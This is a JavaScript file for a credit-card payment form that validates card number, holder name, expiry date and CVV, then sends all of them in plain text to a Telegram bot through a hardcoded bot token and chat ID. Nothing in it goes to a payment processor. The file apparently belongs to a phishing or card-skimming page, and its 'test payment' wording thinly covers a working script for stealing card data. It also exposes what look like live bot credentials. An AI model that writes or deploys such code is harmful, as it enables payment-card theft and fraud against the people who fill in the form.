document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('paymentForm');

  // Live update card display
  document.getElementById('cardNumber').addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      value = value.replace(/(\d{4})/g, '$1 ').trim();
      e.target.value = value;
      document.getElementById('cardNumberDisplay').textContent = value || '**** **** **** ****';
  });

  document.getElementById('cardHolder').addEventListener('input', (e) => {
      const value = e.target.value.toUpperCase();
      e.target.value = value;
      document.getElementById('cardHolderDisplay').textContent = value || 'CARD HOLDER';
  });

  document.getElementById('expiryDate').addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 2) {
          value = value.slice(0, 2) + '/' + value.slice(2);
      }
      e.target.value = value;
      document.getElementById('cardExpiryDisplay').textContent = value || 'MM/YY';
  });

  // Form validation and submission
  form.addEventListener('submit', function(e) {
      e.preventDefault();
      let isValid = true;

      // Card number validation (simple check for length)
      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
      if (cardNumber.length !== 16) {
          document.getElementById('cardNumberError').textContent = 'Invalid card number';
          isValid = false;
      } else {
          document.getElementById('cardNumberError').textContent = '';
      }

      // Card holder validation
      const cardHolder = document.getElementById('cardHolder').value;
      if (cardHolder.length < 3) {
          document.getElementById('cardHolderError').textContent = 'Please enter a valid name';
          isValid = false;
      } else {
          document.getElementById('cardHolderError').textContent = '';
      }

      // Expiry date validation
      const expiryDate = document.getElementById('expiryDate').value;
      const [month, year] = expiryDate.split('/');
      const currentDate = new Date();
      const expiryDateObj = new Date(parseInt('20' + year), parseInt(month) - 1);
      if (expiryDateObj <= currentDate || !month || !year || month > 12) {
          document.getElementById('expiryError').textContent = 'Invalid expiry date';
          isValid = false;
      } else {
          document.getElementById('expiryError').textContent = '';
      }

      // CVV validation
      const cvv = document.getElementById('cvv').value;
      if (cvv.length < 3 || cvv.length > 4) {
          document.getElementById('cvvError').textContent = 'Invalid CVV';
          isValid = false;
      } else {
          document.getElementById('cvvError').textContent = '';
      }

      if (isValid) {
          // Collect form data
          const message = `
New test payment submission:
Card Number: ${cardNumber}
Card Holder: ${cardHolder}
Expiry: ${expiryDate}
CVV: ${cvv}
          `;

          // Send to Telegram bot
          sendToTelegram(message);
      } else {
          showAlert('Please correct the errors and try again.');
      }
  });

  function sendToTelegram(message) {
      const botToken = '6617029413:AAEBeGxAHhvDk6sTa5lX3XRD-VVdVpIvuqY'; // Replace with your actual bot token
      const chatId = '6067267011'; // Replace with your actual chat ID
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      fetch(url, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify({
              chat_id: chatId,
              text: message,
          }),
      })
      .then(response => response.json())
      .then(data => {
          if (data.ok) {
              // Clear the form
              form.reset();
              // Reset card display
              document.getElementById('cardNumberDisplay').textContent = '**** **** **** ****';
              document.getElementById('cardHolderDisplay').textContent = 'CARD HOLDER';
              document.getElementById('cardExpiryDisplay').textContent = 'MM/YY';
              // Optionally, you can show a message that the form was submitted successfully
              // showAlert('Form submitted successfully. Please enter new information for testing.');
          } else {
              showAlert('An error occurred. Please try again.');
          }
      })
      .catch(error => {
          console.error('Error:', error);
          showAlert('An error occurred. Please try again.');
      });
  }

  function showAlert(message) {
      const alertElement = document.getElementById('alert');
      alertElement.textContent = message;
      alertElement.style.display = 'block';

      setTimeout(() => {
          alertElement.style.display = 'none';
      }, 5000); // Hide the alert after 5 seconds
  }
});